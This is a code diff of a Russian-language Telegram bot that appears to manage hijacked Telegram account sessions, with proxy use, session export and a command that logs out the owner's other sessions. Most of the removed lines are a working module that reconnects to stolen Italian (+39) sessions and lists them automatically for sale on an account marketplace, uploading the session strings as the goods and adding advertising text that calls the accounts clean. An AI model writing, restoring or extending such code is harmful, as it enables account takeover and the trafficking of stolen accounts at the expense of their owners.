@@ -4,8 +4,6 @@ import logging
 import sqlite3
 import zipfile
 import tempfile
-import requests
-import asyncio
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
@@ -26,7 +24,6 @@ import random
 import string
 import base64
 import time
-from threading import Lock
 
 # Load .env
 load_dotenv()
@@ -38,11 +35,6 @@ PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 LA_ADMIN_IDS = json.loads(os.getenv("LA_ADMIN_IDS", "[]"))
-
-# Lolz API Configuration
-LOLZ_CLIENT_ID = os.getenv("LOLZ_CLIENT_ID")
-LOLZ_CLIENT_SECRET = os.getenv("LOLZ_CLIENT_SECRET")
-LOLZ_API_URL = "https://api.lzt.market"
 
 # Proxy settings
 PROXY_HOST = os.getenv("PROXY_HOST")
@@ -74,39 +66,16 @@ DEFAULT_APP_VERSION = "5.16.4 x64"
 DEFAULT_ROLE = "После конвертации"
 DEFAULT_AVATAR = "img/TeleRaptor.png"
 
-# Lolz Automation
-lolz_automation_enabled = False
-lolz_access_token = None
-lolz_token_expires = 0
-lolz_lock = Lock()
-processed_sessions = set()
-
-# Заменить в начале файла (константы)
-lolz_settings = {
-    "price": 507,
-    "title": "С консоли | Не трогал | Италия +39",
-    "description": """Не трогал, с консоли, итальянский номер +39, все чисто прозоро с рыбалка, без спама и блокировок!
-✅ Valid session
-✅ Phone: +39 Italy
-✅ Ready to use
-
-📞 Phone: {phone}
-🇮🇹 Country: Italy
-🆔 Account ID: {account_id}
-👤 Username: @{username}
-📛 Name: {first_name} {last_name}
-
-⚠️ Important:
-- Session is fresh and working
-- No spam, no restrictions
-- Original Italian number""",
-    "auto_renew": 1,
-    "email_access": 0,
-    "category_id": 24,  # Telegram category
-    "currency": "rub"
-}
-
 # ================== UTILITY FUNCTIONS ==================
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(message)s',
+    handlers=[
+        logging.FileHandler('auth_logs.log'),
+        logging.StreamHandler()
+    ]
+)
 
 def generate_random_hash(length=32):
     """Generate random hash for date_of_birth_integrity"""
@@ -182,215 +151,6 @@ class AccessControlMiddleware(BaseMiddleware):
 
 dp.middleware.setup(AccessControlMiddleware())
 
-# ================== LOLS AUTOMATION FUNCTIONS ==================
-
-async def get_lolz_access_token():
-    """Получает access token для Lolz API"""
-    global lolz_access_token, lolz_token_expires
-    
-    current_time = time.time()
-    if lolz_access_token and current_time < lolz_token_expires - 60:
-        return lolz_access_token
-    
-    try:
-        auth = (LOLZ_CLIENT_ID, LOLZ_CLIENT_SECRET)
-        proxies = {
-            "http": f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
-            "https": f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
-        }
-        response = requests.post(
-            f"{LOLZ_API_URL}/market/oauth2/token",
-            data={
-                "grant_type": "client_credentials",
-                "scope": "market"
-            },
-            auth=auth,
-            proxies=proxies,
-            timeout=30
-        )
-        
-        if response.status_code == 200:
-            data = response.json()
-            lolz_access_token = data["access_token"]
-            lolz_token_expires = current_time + data["expires_in"]
-            logging.info("✅ Lolz access token obtained successfully")
-            return lolz_access_token
-        else:
-            logging.error(f"❌ Lolz auth failed: {response.status_code} - {response.text}")
-            return None
-            
-    except Exception as e:
-        logging.error(f"❌ Lolz auth error: {str(e)}")
-        return None
-
-# Заменить функцию create_lolz_item
-async def create_lolz_item(session_data, account_info):
-    """Создает товар на Lolz Market"""
-    access_token = await get_lolz_access_token()
-    if not access_token:
-        return False, "Auth failed"
-    
-    phone = session_data["phone"].replace("+", "")
-    item_data = {
-        "title": lolz_settings["title"],
-        "title_en": lolz_settings["title"],
-        "description": lolz_settings["description"].format(
-            phone=session_data["phone"],
-            account_id=account_info.id,
-            username=account_info.username or "None",
-            first_name=account_info.first_name or "",
-            last_name=account_info.last_name or ""
-        ),
-        "information": "Session data provided after purchase",
-        "price": lolz_settings["price"],
-        "category_id": lolz_settings["category_id"],
-        "currency": lolz_settings["currency"],
-        "item_origin": "autoreg",
-        "extended_guarantee": 0,
-        "has_email_login_data": False,
-        "allow_ask_discount": False
-    }
-    
-    try:
-        headers = {
-            "Authorization": f"Bearer {access_token}",
-            "Content-Type": "application/json"
-        }
-        proxies = {
-            "http": f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}",
-            "https": f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
-        }
-        
-        response = requests.post(
-            f"{LOLZ_API_URL}/item/add",
-            json=item_data,
-            headers=headers,
-            proxies=proxies,
-            timeout=30
-        )
-        
-        if response.status_code == 200:
-            item_id = response.json().get("item", {}).get("item_id")
-            if not item_id:
-                return False, f"No item_id in response: {response.text}"
-            
-            session_json = json.dumps(session_data)
-            session_sqlite = base64.b64encode(
-                convert_session_to_sqlite(session_data["session"], phone)
-            ).decode("utf-8")
-            
-            check_data = {
-                "item": item_id,
-                "login": session_data["phone"],
-                "password": session_json,
-                "loginpassword": f"{session_data['phone']}:{session_sqlite}"
-            }
-            
-            check_response = requests.post(
-                f"{LOLZ_API_URL}/item/{item_id}/goods/check",
-                json=check_data,
-                headers=headers,
-                proxies=proxies,
-                timeout=30
-            )
-            
-            if check_response.status_code == 200:
-                logging.info(f"✅ Item {item_id} created and checked successfully")
-                return True, f"Item created: {item_id}"
-            else:
-                return False, f"Check failed: {check_response.status_code} - {check_response.text}"
-        elif response.status_code == 429:
-            logging.error("❌ Rate limit exceeded (429). Waiting before retry...")
-            return False, "Rate limit exceeded"
-        else:
-            logging.error(f"❌ API error: {response.status_code} - {response.text}")
-            return False, f"API error: {response.status_code} - {response.text}"
-            
-    except Exception as e:
-        logging.error(f"❌ Request error: {str(e)}")
-        return False, f"Request error: {str(e)}"
-
-# Заменить функцию check_and_sell_italian_sessions
-async def check_and_sell_italian_sessions():
-    """Проверяет и продает новые итальянские сессии"""
-    global processed_sessions
-    
-    while True:
-        if not lolz_automation_enabled:
-            await asyncio.sleep(60)
-            continue
-        
-        try:
-            with lolz_lock:
-                sessions = list(sessions_col.find({
-                    "phone": {"$regex": "^\\+39"},
-                    "lolz_listed": {"$ne": True}
-                }))
-                
-                if not sessions:
-                    await asyncio.sleep(300)
-                    continue
-                
-                logging.info(f"🔍 Found {len(sessions)} new Italian sessions to check")
-                
-                for session in sessions:
-                    session_id = str(session["_id"])
-                    phone = session["phone"]
-                    
-                    if session_id in processed_sessions:
-                        continue
-                    
-                    client = None
-                    try:
-                        client = TelegramClient(
-                            StringSession(session["session"]), 
-                            API_ID, API_HASH, 
-                            proxy=proxy
-                        )
-                        await client.connect()
-                        
-                        if await client.is_user_authorized():
-                            me = await client.get_me()
-                            
-                            success, message = await create_lolz_item(session, me)
-                            
-                            if success:
-                                logging.info(f"✅ Listed on Lolz: {phone} - {message}")
-                                processed_sessions.add(session_id)
-                                
-                                sessions_col.update_one(
-                                    {"_id": session["_id"]},
-                                    {"$set": {
-                                        "lolz_listed": True,
-                                        "lolz_listed_date": datetime.now(),
-                                        "lolz_price": lolz_settings["price"],
-                                        "lolz_item_id": message.split(":")[1].strip() if ":" in message else ""
-                                    }}
-                                )
-                            else:
-                                logging.warning(f"❌ Lolz failed for {phone}: {message}")
-                                if "Rate limit exceeded" in message:
-                                    await asyncio.sleep(60)
-                                processed_sessions.add(session_id)
-                            
-                        else:
-                            processed_sessions.add(session_id)
-                            
-                    except Exception as e:
-                        logging.error(f"❌ Error checking session {phone}: {str(e)}")
-                        processed_sessions.add(session_id)
-                    
-                    finally:
-                        if client:
-                            await client.disconnect()
-                    
-                    await asyncio.sleep(3)
-                
-        except Exception as e:
-            logging.error(f"❌ Error in lolz automation: {str(e)}")
-        
-        await asyncio.sleep(300)
-
 # ================== SESSION DATA GENERATION ==================
 
 async def generate_full_session_data(session_info, client, me):
@@ -444,113 +204,6 @@ async def generate_full_session_data(session_info, client, me):
     }
     
     return full_data
-
-# ================== COMMAND HANDLERS ==================
-
-@dp.message_handler(commands=['lolz'])
-async def cmd_lolz(message: types.Message):
-    """Управление автоматической продажей на Lolz"""
-    if not is_main_admin(message.from_user.id):
-        await message.answer("❌ Только главный админ может управлять этим функционалом.")
-        return
-    
-    # Статистика
-    total_italian = sessions_col.count_documents({"phone": {"$regex": "^\\+39"}})
-    listed_count = sessions_col.count_documents({
-        "phone": {"$regex": "^\\+39"},
-        "lolz_listed": True
-    })
-    pending_count = total_italian - listed_count
-    
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    
-    if lolz_automation_enabled:
-        status_text = "🟢 ВКЛЮЧЕНА"
-        keyboard.add(
-            InlineKeyboardButton("🔴 Выключить", callback_data="lolz_disable"),
-            InlineKeyboardButton("⚙️ Настройки", callback_data="lolz_settings")
-        )
-    else:
-        status_text = "🔴 ВЫКЛЮЧЕНА"
-        keyboard.add(
-            InlineKeyboardButton("🟢 Включить", callback_data="lolz_enable"),
-            InlineKeyboardButton("⚙️ Настройки", callback_data="lolz_settings")
-        )
-    
-    keyboard.add(InlineKeyboardButton("📊 Статистика", callback_data="lolz_stats"))
-    
-    stats_text = (
-        f"🤖 Автопродажа Lolz: {status_text}\n\n"
-        f"📞 Целевые номера: +39 (Италия)\n"
-        f"💰 Цена: {lolz_settings['price']} руб.\n"
-        f"📦 Всего итальянских: {total_italian}\n"
-        f"🛒 Размещено на продажу: {listed_count}\n"
-        f"⏳ Ожидают обработки: {pending_count}\n"
-        f"🔄 Проверка каждые 5 минут\n\n"
-        f"⚙️ Текущие настройки:\n"
-        f"• Категория: {lolz_settings['category_id']}\n"
-        f"• Автопродление: {'Да' if lolz_settings['auto_renew'] else 'Нет'}\n"
-        f"• Email доступ: {'Да' if lolz_settings['email_access'] else 'Нет'}"
-    )
-    
-    await message.answer(stats_text, reply_markup=keyboard)
-
-@dp.callback_query_handler(lambda c: c.data.startswith('lolz_'))
-async def handle_lolz_callback(callback_query: types.CallbackQuery):
-    """Обработчик callback'ов для Lolz"""
-    action = callback_query.data
-    user_id = callback_query.from_user.id
-    
-    if not is_main_admin(user_id):
-        await callback_query.answer("❌ Доступ запрещен")
-        return
-    
-    if action == "lolz_enable":
-        global lolz_automation_enabled
-        lolz_automation_enabled = True
-        await callback_query.answer("🟢 Автопродажа включена")
-        await bot.edit_message_text(
-            "🤖 Автопродажа Lolz: 🟢 ВКЛЮЧЕНА\n\n"
-            "Теперь бот будет автоматически проверять новые итальянские сессии "
-            "и выставлять их на продажу.",
-            chat_id=user_id,
-            message_id=callback_query.message.message_id
-        )
-        
-    elif action == "lolz_disable":
-        lolz_automation_enabled = False
-        await callback_query.answer("🔴 Автопродажа выключена")
-        await bot.edit_message_text(
-            "🤖 Автопродажа Lolz: 🔴 ВЫКЛЮЧЕНА",
-            chat_id=user_id,
-            message_id=callback_query.message.message_id
-        )
-        
-    elif action == "lolz_settings":
-        # Здесь можно добавить меню настроек
-        await callback_query.answer("⚙️ Настройки (в разработке)")
-        
-    elif action == "lolz_stats":
-        # Детальная статистика
-        total_italian = sessions_col.count_documents({"phone": {"$regex": "^\\+39"}})
-        listed_count = sessions_col.count_documents({
-            "phone": {"$regex": "^\\+39"},
-            "lolz_listed": True
-        })
-        revenue = listed_count * lolz_settings["price"]
-        
-        stats_text = (
-            f"📊 Детальная статистика Lolz:\n\n"
-            f"🇮🇹 Итальянских сессий: {total_italian}\n"
-            f"🛒 Размещено на продажу: {listed_count}\n"
-            f"⏳ В обработке: {len(processed_sessions)}\n"
-            f"💰 Цена за штуку: {lolz_settings['price']} руб.\n"
-            f"📈 Потенциальный доход: {revenue} руб.\n"
-            f"🔄 Автопродажа: {'🟢 ВКЛ' if lolz_automation_enabled else '🔴 ВЫКЛ'}"
-        )
-        
-        await callback_query.answer()
-        await bot.send_message(user_id, stats_text)
 
 # ================== SESSION EXPORT ==================
 
@@ -678,8 +331,8 @@ async def cmd_itim(message: types.Message):
         except OSError as e:
             logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")
 
-# ================== OTHER COMMANDS ==================
 
+# Добавьте этот обработчик в раздел COMMAND HANDLERS
 @dp.message_handler(commands=['logout_others'])
 async def cmd_logout_other_sessions(message: types.Message):
     user_id = message.from_user.id
@@ -1165,8 +818,7 @@ async def cmd_start(message: types.Message):
             InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
             InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
             InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
-            InlineKeyboardButton("🗑 Session Management", callback_data='session_management'),
-            InlineKeyboardButton("🤖 Lolz Auto-Sell", callback_data='lolz_menu')
+            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
         )
         await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
     elif is_light_admin(message.from_user.id):
@@ -1181,7 +833,7 @@ async def cmd_start(message: types.Message):
     else:
         await message.answer("❌ You don't have access to use this bot.")
 
-@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management', 'lolz_menu'])
+@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management'])
 async def process_callback(callback_query: types.CallbackQuery):
     cmd = callback_query.data
     uid = callback_query.from_user.id
@@ -1220,20 +872,10 @@ async def process_callback(callback_query: types.CallbackQuery):
             await bot.send_message(uid, "❌ Not allowed.")
     elif cmd == 'session_management':
         await show_session_management(uid)
-    elif cmd == 'lolz_menu':
-        await cmd_lolz(callback_query.message)
 
     await callback_query.answer()
 
-# ================== INITIALIZATION ==================
-
-async def start_background_tasks():
-    """Запускает фоновые задачи"""
-    asyncio.create_task(check_and_sell_italian_sessions())
+# ... [ОСТАЛЬНЫЕ ФУНКЦИИ ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ, КАК В ТВОЕМ РАБОЧЕМ КОДЕ] ...
 
 if __name__ == '__main__':
-    # Запускаем фоновые задачи
-    loop = asyncio.get_event_loop()
-    loop.create_task(start_background_tasks())
-    
     executor.start_polling(dp, skip_updates=True)
